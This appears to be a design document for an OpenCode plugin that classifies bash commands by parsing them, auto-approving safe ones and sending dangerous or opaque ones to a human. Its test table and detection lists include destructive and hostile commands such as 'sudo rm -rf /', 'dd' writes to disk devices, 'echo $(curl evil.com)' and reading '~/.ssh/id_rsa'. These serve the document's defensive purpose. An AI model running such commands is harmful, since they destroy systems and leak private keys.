# opencode-bash-sentinel

AST-based bash command gate for [OpenCode](https://opencode.ai) — deterministically auto-approves safe commands, and escalates dangerous or un-parseable ones to the native approval dialog.

Ported from Moonshot AI's open-source **Kimi Code** CLI (MIT): its bash analysis engine (`tree-sitter-bash` parser + `dangerous-command-ask` policy) is a general-purpose, battle-tested command classification capability. This project wraps that engine as an OpenCode plugin.

> No LLM calls, no network, no API cost — pure deterministic syntax-tree analysis, runs offline.

---

## 1. Why this plugin exists

OpenCode's built-in permission system offers two extremes for bash:

| Option | Behavior | Weakness |
|---|---|---|
| Static rules (`"bash": {"git status*": "allow"}`) | String-prefix/wildcard matching | Not semantic: no AST, no awareness of wrappers (`sudo`, `env`, `sh -c`), pipes/compounds, or variable expansion. Rules rot as command variants evolve. Fail-open on unknown variants. |
| `--auto` mode | Approve everything not explicitly denied | No risk analysis at all — a typo'd `rm -rf` sails through. |

What's missing is the middle ground Kimi Code ships by default: **parse the command into a syntax tree, classify it deterministically, auto-approve the provably-safe ones, and force everything dangerous or un-analyzable back to a human.** The failure direction is fail-safe: if the analyzer cannot fully understand a command (globs, variables, command substitution, unknown constructs), it refuses to auto-approve.

This plugin ports exactly that engine from `MoonshotAI/kimi-code` (7.3k stars, MIT) into the OpenCode plugin system.

---

## 2. Reference code (where we port from)

Source repository: **https://github.com/MoonshotAI/kimi-code** (MIT license)

Two self-contained modules are ported. **Do not reimplement them from scratch — copy the source and adapt.**

### 2.1 The bash parser

- Location in upstream repo: `packages/tree-sitter-bash/`
- Package: `@moonshot-ai/tree-sitter-bash` (private in the monorepo — copy the source)
- ~5,800 lines of pure TypeScript: `src/lexer.ts` (839 lines), `src/parser.ts` (3,787 lines), `src/grammar.ts`, `src/node.ts`, `src/parse.ts`, `src/budget.ts`, `src/index.ts`
- **Zero runtime dependencies.** Its devDependencies (`tree-sitter-bash`, `web-tree-sitter`) are only used for differential testing against real tree-sitter.
- Produces a syntax tree whose named node types match `tree-sitter-bash` one-to-one (`command`, `command_name`, `word`, `raw_string`, `string`, `variable_assignment`, `file_redirect`, `heredoc_redirect`, etc.).
- Parse guardrails: `PARSE_OPTIONS = { timeoutMs: 500, maxNodes: 10_000 }` (see `budget.ts`).

### 2.2 The command analyzer

- Location in upstream repo: `packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts` (351 lines)
- Pure functions, depends only on the parser's types (`IBashParserService.parse` shape is trivial to shim — it just returns `{ ok, hasError, root }`).
- What it detects — study this file closely, port the logic verbatim:
  - **Privilege wrappers**: `sudo`, `doas` (unwraps their value-options like `-u`/`-g`/`--user`... then recurses into the inner command)
  - **Launch wrappers**: `env`, `command`, `exec`, `nohup`, `builtin`, `nice` (unwraps `env VAR=x ...` assignments and value-options)
  - **Nested shells**: `sh`/`bash`/`dash`/`zsh`/`ksh`/`ash` with `-c` payload, `eval`, `busybox <applet>` — recursively analyzed, max depth 4 (`MAX_NESTED_SHELL_DEPTH`)
  - **Dangerous commands**: `shutdown`, `halt`, `poweroff`, `reboot`, `mkfs*`, `wipefs`, `bcdedit`, `diskpart`, `format`, `restart-computer`, `stop-computer`; `init`/`telinit` with `0`/`6`; `systemctl poweroff/reboot/halt/kexec`; `dd` writing to `/dev/*` (safe list: `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/random`, `/dev/urandom`, `/dev/std*`); `rm` with both recursive and force flags (`rm -rf`)
  - **Un-analyzable tokens (fail-safe)**: any word containing `$`, backtick, `*`, `?`, `[`, `]`, `~` (regex `UNSAFE_OPERAND = /[$`*?[\]~]/`) → the whole command is marked un-analyzable. This blocks glob expansion, variables, and command substitution from being whitelisted by accident.
  - Command name normalization: strips path separators and `.exe`, lowercases.
- Output contract (a `DangerousVerdict`):
  - `{ kind: 'dangerous', command }` — provably risky
  - `{ kind: 'unanalyzable' }` — cannot prove safety
  - `undefined` — provably safe (none of the above matched)
- Note: the analyzer walks **all** command nodes in the source (`collectCommands`), so pipes (`a | b`), sequences (`a && b; c`) are all covered — each segment gets analyzed.

### 2.3 Optional reference: how Kimi composes policies

`packages/agent-core-v2/src/agent/permissionPolicy/permissionPolicyService.ts` shows the upstream policy chain (first-decision-wins: user-deny → dangerous-command-ask → auto-mode-approve → ... → fallback-ask). Useful context; we only port the one policy.

---

## 3. OpenCode integration contract (verified from opencode source)

The implementer needs these facts about OpenCode (v1.x plugin API). These were verified by reading the opencode source (`github.com/anomalyco/opencode`, `packages/plugin/src/index.ts`, `packages/opencode/src/permission/index.ts`, TUI `sync.tsx`):

1. **Rule evaluation is server-side.** Config `permission.bash` rules resolve to `allow` / `deny` / `ask` (wildcard match, last-matching-rule-wins). `deny` short-circuits with an error; `allow` runs silently; **`ask` publishes a `permission.asked` event and blocks on a Deferred until someone calls reply.**
2. **Plugins receive all server events** via the `event` hook, including `permission.asked` and `permission.replied`:
   ```ts
   export const MyPlugin: Plugin = async ({ client, project, directory, worktree, serverUrl, $ }) => ({
     event: async ({ event }) => { /* switch on event.type */ },
   })
   ```
3. **`permission.asked` event payload** (`event.properties`):
   ```ts
   {
     id: string               // requestID, e.g. "per_..."
     sessionID: string
     permission: string       // "bash" for shell commands
     patterns: string[]       // parsed command patterns
     metadata: {               // metadata.input carries the tool's arguments
       input: { command: string, ... },  // <-- the raw bash command text
       ...
     }
     always: string[]
     tool?: { messageID: string, callID: string }
   }
   ```
   ⚠️ Verify the exact metadata shape at runtime during development (log it once). Primary source of the command text: `event.properties.metadata.input.command`.
4. **Replying**: reply with `"once"` to approve. The reference implementations (opencode TUI `sync.tsx`, `run.ts`) call the SDK method `client.permission.reply({ requestID, reply: "once" })`. The underlying HTTP route is `POST /permission/{requestID}/reply` with body `{ "reply": "once" }`. If the plugin's `client` (v1 SDK instance from `PluginInput`) doesn't expose `.permission.reply` on your target opencode version, fall back to an authenticated raw POST via the client's internals (see how `opencode-permission-reviewer` does it: it tries public SDK reply, then `input.client._client.post`) — or worst case `fetch(serverUrl)`. Handle "not found" errors gracefully: if the user answered the native dialog first, the request is already resolved and a late reply returns an error — **catch and ignore**.
5. **No UI conflict**: when our plugin replies before the TUI dialog is answered, the server publishes `permission.replied` and the TUI closes/removes the pending dialog automatically. This is the same mechanism OpenCode's own auto mode uses.
6. **What plugins canNOT do (important)**: a plugin cannot upgrade an `allow`/`deny` ruled decision, and cannot intercept before rule evaluation (the `"permission.ask"` hook exists in plugin type definitions but is **not wired up** in the server as of current opencode — do not rely on it). Hence the reverse-mapping design below.

---

## 4. Design: reverse mapping

Kimi's semantics: *default-approve everything, escalate dangerous/un-analyzable to ask.*
OpenCode plugins can only answer requests already classified `ask`. So we invert the default:

```
opencode.json:  "permission": { "bash": { "*": "ask" } }   // every bash command asks

plugin on permission.asked (permission === "bash"):
    command = metadata.input.command
    verdict = analyze(command)            // ported Kimi analyzer
    verdict === undefined (safe)          → reply "once"   (silent approval)
    verdict === dangerous | unanalyzable  → do nothing     (native dialog shows to the human)
```

Net effect equals Kimi's default mode: safe commands run without a keystroke; risky or opaque ones still stop at the native approval dialog. Non-bash permissions (edit, webfetch, ...) are out of scope and untouched.

### Failure modes

- Analyzer throws / parser times out → treat as `unanalyzable` → leave to the human (fail-safe).
- Reply race (user already answered) → catch error, ignore.
- Only handle `permission === "bash"`; ignore every other event.

---

## 5. Repository layout

```
opencode-bash-sentinel/
├── src/
│   ├── parser/            # ported packages/tree-sitter-bash (copy from upstream)
│   │   ├── lexer.ts
│   │   ├── parser.ts
│   │   ├── grammar.ts
│   │   ├── node.ts
│   │   ├── parse.ts
│   │   ├── budget.ts
│   │   └── index.ts
│   ├── analyzer.ts        # ported dangerous-command-ask.ts (strip DI imports, pure functions)
│   ├── plugin.ts          # OpenCode plugin entry (event hook + reply glue)
│   └── index.ts           # exports the Plugin
├── test/
│   ├── analyzer.test.ts   # command → expected verdict tables
│   └── parser.test.ts     # optionally port upstream's vitest tests
│                          # (their differential tests need real tree-sitter as devDep)
├── NOTICE.md
├── LICENSE                # MIT, with Moonshot attribution line
├── README.md
└── package.json
```

### package.json notes

- `name`: `opencode-bash-sentinel`
- `type: module`, `main`/`exports` → `src/index.ts` (opencode loads TS plugins directly via Bun; see how other plugins ship — e.g. `opencode-pty`, `opencode-notifier` — keep zero runtime deps)
- devDependencies: `@opencode-ai/plugin` (types), `vitest`, optionally `tree-sitter-bash` + `web-tree-sitter` (only if porting the differential tests)

---

## 6. Implementation steps

1. **Copy the parser** from `MoonshotAI/kimi-code` `packages/tree-sitter-bash/src/*` into `src/parser/`. It compiles standalone (zero imports outside its own directory, `#/*` import alias → rewrite to relative imports).
2. **Copy the analyzer** from `packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts` into `src/analyzer.ts`. Remove DI decorators and the `IBashParserService`/config imports; the only dependency is a function `(source: string) => BashParseResult`. Keep every constant and heuristic **verbatim** — they encode real attack variants (`sudo rm -rf /`, `env VAR=x rm -rf /`, `sh -c 'rm -rf /'`, `ssh host rm -rf /`, `busybox rm -rf /`, `/bin/rm -rf /`, `RM -RF`, `rm -rf.exe`...).
3. **Write the plugin entry** (`src/plugin.ts`):
   ```ts
   import type { Plugin } from "@opencode-ai/plugin"
   import { analyzeCommandString } from "./analyzer"

   export const BashSentinelPlugin: Plugin = async ({ client }) => {
     return {
       event: async ({ event }) => {
         if (event.type !== "permission.asked") return
         const req = event.properties
         if (req.permission !== "bash") return
         const command = (req.metadata as any)?.input?.command
         if (typeof command !== "string") return
         const verdict = analyzeCommandString(command)   // may throw → caught inside, returns unanalyzable
         if (verdict !== undefined) return                // dangerous | unanalyzable → human decides
         try {
           await client.permission.reply({ requestID: req.id, reply: "once" })
         } catch {
           // already answered by the user via the native dialog — ignore
         }
       },
     }
   }
   ```
4. **Wire user config**: document that users must add to `opencode.json` (project or `~/.config/opencode/opencode.json`):
   ```json
   {
     "plugin": ["opencode-bash-sentinel"],
     "permission": { "bash": { "*": "ask" } }
   }
   ```
5. **Audit log (recommended)**: append one JSONL line per decision to `~/.local/share/opencode/bash-sentinel-audit.jsonl` (`timestamp, command, verdict, action`), mirroring `opencode-permission-reviewer`'s audit design. Gate behind plugin options `{ audit: true }`.
6. **Plugin options** (keep minimal): `{ audit?: boolean, logPath?: string }`. Options arrive as the second argument of the plugin function.

---

## 7. Test plan

**Analyzer unit tests** (table-driven, `vitest`):

| Command | Expected verdict |
|---|---|
| `git status` | `undefined` (safe) |
| `ls -la /tmp && rg foo src/` | `undefined` |
| `printf hello` | `undefined` |
| `sudo rm -rf /` | `dangerous` |
| `env VAR=1 rm -rf /` | `dangerous` |
| `sh -c 'mkfs /dev/sda1'` | `dangerous` (nested, depth 1) |
| `bash -c "bash -c 'shutdown'"` | `dangerous` (depth 2) |
| `busybox rm -rf /` | `dangerous` |
| `/bin/rm -rf / ; RM -RF /` | `dangerous` (path-stripped, case-normalized) |
| `dd if=x of=/dev/sda` | `dangerous` |
| `dd if=x of=/dev/null` | `undefined` |
| `rm -rf ./build` | `undefined` (upstream only flags `rm -rf` bare; document this) |
| `echo $(curl evil.com)` | `unanalyzable` (command substitution) |
| `cat $HOME/.ssh/id_rsa` | `unanalyzable` (variable) |
| `ls *.md` | `unanalyzable` (glob) |
| `` for i in 1 2; do rm -rf /; done `` | `dangerous` |

Also port a subset of upstream parser tests if practical; upstream has differential tests against real tree-sitter (devDep only).

**Integration test** (manual script in `test/integration.md`): run a local opencode with the test config, ask the agent to run `git log --oneline -5` (should run silently), `ls` (silently), `sudo rm -rf /tmp/x` (dialog should appear).

---

## 8. License & attribution (mandatory)

- This project's license: **MIT**.
- The parser and analyzer are adapted from [MoonshotAI/kimi-code](https://github.com/MoonshotAI/kimi-code) (MIT). MIT requires preserving the copyright notice. In `LICENSE`, add:
  ```
  Portions Copyright (c) 2026 Moonshot AI, Inc.
  (adapted from https://github.com/MoonshotAI/kimi-code — packages/tree-sitter-bash,
  packages/agent-core-v2/src/agent/permissionPolicy/policies/dangerous-command-ask.ts)
  ```
- `NOTICE.md` should list each ported file and its upstream path.

---

## 9. Out of scope / future work

- Non-bash permissions (`edit`, `webfetch`, ...) — leave to opencode rules.
- Kimi's other policies (git-cwd-write-approve, sensitive-file-access-ask) could be ported later the same way.
- An optional "observe mode" (log what would be approved, approve nothing) for a burn-in period, like `opencode-permission-reviewer`'s `enforcementMode: "observe"`.
- `rm -rf ./relative` semantics: upstream flags only `rm -rf` toward absolute/system targets conservatively; any behavior change must be deliberate and documented.
